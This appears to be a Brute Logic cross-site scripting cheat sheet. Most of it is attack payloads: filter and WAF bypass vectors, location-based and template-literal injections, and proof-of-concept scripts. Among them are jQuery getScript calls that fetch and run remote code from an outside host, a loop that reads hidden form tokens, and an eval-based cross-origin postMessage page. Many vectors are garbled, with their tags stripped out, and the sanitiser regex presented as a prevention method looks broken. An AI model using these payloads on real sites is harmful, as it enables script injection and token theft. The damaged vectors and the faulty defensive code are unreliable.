# XSS Prevention and Exploitation Techniques

## Preventing XSS in Different Contexts

### General Usage
- **Context**: Use to prevent XSS in various contexts, provided the input does not reflect in non-delimited strings, within backticks, or any other `eval`-like functions (in JavaScript context).
- **Limitations**: Does not protect against DOM-based XSS; only effective for source-based XSS cases.
- **Code Example**:
  ```php
  $input = preg_replace("/:|\\/", "", htmlentities($input, ENT_QUOTES));
  ```

## JavaScript Execution Delay

- **Purpose**: Use when a JavaScript library or other required resource is not fully loaded during the execution of the payload.
- **Example**:
  ```javascript
  onload = function() { $.getScript('//brutelogic.com.br/2.js') };
  onload = x => $.getScript('//brutelogic.com.br/2.js');
  ```

## Image Vectors with Alternative Event Handlers

- **Purpose**: Use to trigger image vectors with event handlers other than `onerror`.
- **Examples**:
  - `onloadend=alert(1)>`
  - `onloadstart=alert(1)>`

## Shortest XSS Payloads

- **Purpose**: Use when you have limited space for injection. Requires a native script (present in the source code) called with a relative path placed after the injection point.
- **Requirements**:
  - Attacker's server must respond with the attacking script to the exact request made by the native script (same path) or within a default 404 page (easier).
  - The shorter the domain, the better.

## Mobile-only Event Handlers

- **Purpose**: Use when targeting mobile applications.
- **Body Tag Vectors**:
  - `#x`
  - `#x`
  - `press F12!`
  - `press F1!`
  - Note: The last one works only for Internet Explorer.

## Less Known XSS Vectors

- **Collection of less known XSS vectors**:
  - `right click me!`

### Proof of Concept (PoC) Examples

#### Shake Your Body
- **Purpose**: Shakes all elements on the page to visualize the vulnerability.
- **Code**:
  ```javascript
  setInterval(x => {
    b = document.body.style;
    b.marginTop = (b.marginTop == '4px') ? '-4px' : '4px';
  }, 5);
  ```

#### Brutality
- **Purpose**: Displays an image of Mortal Kombat’s Sub-Zero character along with a "brutality" game sound.
- **Code**:
  ```javascript
  d = document;
  i = d.createElement('img');
  i.src = '//brutelogic.com.br/brutality.jpg';
  d.body.insertBefore(i, d.body.firstChild);
  new Audio('//brutelogic.com.br/brutality.mp3').play();
  ```

#### Alert Hidden Values
- **Purpose**: Proves that hidden HTML values like tokens and nonces can be stolen.
- **Code**:
  ```javascript
  f = document.forms;
  for (i = 0; i < f.length; i++) {
    alert(f[i].value);
  }
  ```

## Cross-Origin Script - CrossPwn

- **Usage**: Save the content below as an `.html` file and use it as follows:
  - URL: `http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/status.html&msg=alert(document.domain)`
  - Where:
    - `facebook.com` is an allowed origin.
    - `localhost` is the attacking domain.
    - `//brutelogic.com.br/tests/status.html` is the target page.
    - `alert(document.domain)` is the message sent (payload).

### Code
```html
<!-- CrossPwn -->
<script>
  window.onmessage = function(event) {
    if (event.origin !== 'http://facebook.com') return;
    eval(event.data.msg);
  };
</script>
```

## Location Based Payloads

- **Purpose**: Uses document properties to feed another document property, the location, leading to complex vectors useful for bypassing filters and WAFs.
- **Default Event Handler**: `onmouseover`
- **URL Encoding**: Encode the plus sign (+) as `%2B` in URLs.

### Location Basics
- **Vectors**:
  - `javascript:alert(1)//`

### Location with URL Fragment
- **Vectors**:
  - `:/*hoverme!`
  - `#*/alert(1)`
  - `:'hoverme!`
  - `#'-alert(1)`
  - `hoverme!#`-alert(1)`
  - `javascript:'-`hoverme!#`-alert(1)`
  - `cript:'-`hoverme!`
  - `#`-alert(1)`
  - `javascript:#%0Aalert(1)`
  - `cript:#%0Aalert(1)`

### Location with Leading Alert
- **Vectors**:
  - `alert(1)hoverme!`
  - `alert(1)cript:`hoverme!`
  - `javascript:1/*hoverme!*/`
  - `javascript:/*hoverme!*/"javascript:/*hoverme!`

### Location with Self URL (Firefox Only)
- **Vectors**:
  - `?[P]=<svg/onload=alert(1)>hoverme!`
  - `&[P]=<svg/onload=alert(1)>hoverme!`
  - `hoverme!`
  - `&[P]=<svg/onload=alert(1)>hoverme!`

### Location with Template Literal
- **Vectors**:
  - `${alert(1)}hoverme!`
  - `${alert(1)}javascript:`//hoverme!`
  - `${alert(1)}cript:`//hoverme!`
  - `${alert(1)}`hoverme!`
  - `${alert(1)}`cript:`hoverme!`

## Inner & Outer HTML Properties Alternative

- **Purpose**: Uses `innerHTML` and `outerHTML` properties to achieve the same result as location-based vectors but requires creating a complete HTML vector.
- **Elements**:
  - `all[0]`, `anchors[0]`, `embeds[0]`, `forms[0]`, `images[0]`, `links[0]`, `scripts[0]`
  - These can replace `head` or `body` elements.

## XSS Vector Schemes

- **Schemes**:
  - **Scheme 1 (tag name + handler)**:
    - `%09 %09 %09 %09`
    - `%0A %0A %0A %0A`
    - `%0C %0C %0B %0B`
    - `%0D %0D %0C %0C`
    - `%20 %20 %0D %0D`
    - `%2F %20 %20`
    - `/ %22 %22`
    - `+ %27 %27`
    - `' '`
    - `" "`
    - `+ +`

  - **Scheme 2 (tag name + attribute + handler)**:
    - `%09 %09 %09 %09 %09 %09 %09`
    - `%0A %0A %0A %0A %0A %0A %0A`
    - `%0C %0C %0C %0C %0C %0B %0B`
    - `%0D %0D %0D %0D %0D %0C %0C`
    - `%20 %20 %20 %20 %20 %0D %0D`
    - `%2F %2F %22 %22 %20 %20`
    - `/ / %27 %27 %22 %22`
    - `+ + ' ' %27 %27`
    - `" " ' '`
    - `+ + " "`
    - `+ +`

  - **Scheme 3 (tag name + href|src|data|action|formaction)**:
    - `%09 %09 %0X %09 %09 %09`
    - `%0A %0A %1X %0A %0A %0A`
    - `%0C %0C %20 %0D %0D %0B`
    - `%0D %0D %22 ENT ENT %0C`
    - `%20 %20 %27 %0D`
    - `%2F %2F ENT %20`
    - `/ / + %22`
    - `+ + %27`
    - `'`
    - `"`
    - `+`

---

© 2020 Brute Logic – All rights reserved.